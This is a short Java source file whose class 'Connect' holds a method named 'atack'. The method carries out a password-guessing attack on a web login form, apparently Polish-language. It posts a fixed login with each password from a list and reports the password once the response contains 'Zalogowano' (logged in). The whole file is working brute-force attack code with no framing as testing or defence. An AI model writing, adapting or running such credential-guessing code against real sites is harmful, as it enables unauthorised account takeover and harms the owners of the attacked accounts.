import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;

public class Connect {

	public static String atack(String adressUrl, String login, List<String> passwordList) throws Exception {

		for (int i = 0; i < passwordList.size(); i++) {

			
			URL url = new URL(adressUrl);
			URLConnection conn = url.openConnection();
			conn.setDoOutput(true);
			OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());

			writer.write("login=" + login + "&haslo=" + passwordList.get(i));
			writer.flush();
			String line;
			BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			while ((line = reader.readLine()) != null) {
				if (line.indexOf("Zalogowano") >= 0) {
					return "Znalezione has³o to: " + passwordList.get(i);
				}
			}
			writer.close();
			reader.close();

		}

		return "Nie znaleziono has³a";
	}
}
